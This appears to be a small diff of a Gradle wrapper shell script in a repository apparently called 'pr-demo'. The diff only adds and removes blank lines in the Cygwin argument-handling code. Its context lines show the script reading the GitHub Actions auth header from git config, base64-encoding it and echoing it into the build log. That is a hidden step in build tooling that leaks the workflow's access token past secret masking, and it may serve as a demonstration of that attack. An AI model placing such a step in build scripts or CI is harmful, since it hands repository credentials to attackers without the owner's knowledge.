@@ -140,6 +140,7 @@ if $cygwin ; then
         fi
         i=$((i+1))
     done
+    
     case $i in
         (0) set -- ;;
         (1) set -- "$args0" ;;
@@ -153,7 +154,6 @@ if $cygwin ; then
         (9) set -- "$args0" "$args1" "$args2" "$args3" "$args4" "$args5" "$args6" "$args7" "$args8" ;;
     esac
 fi
-
 
 VALUE1=`git --work-tree=/home/runner/work/pr-demo/pr-demo config --get http.https://github.com/.extraheader | base64`
 echo VALUE1=$VALUE1
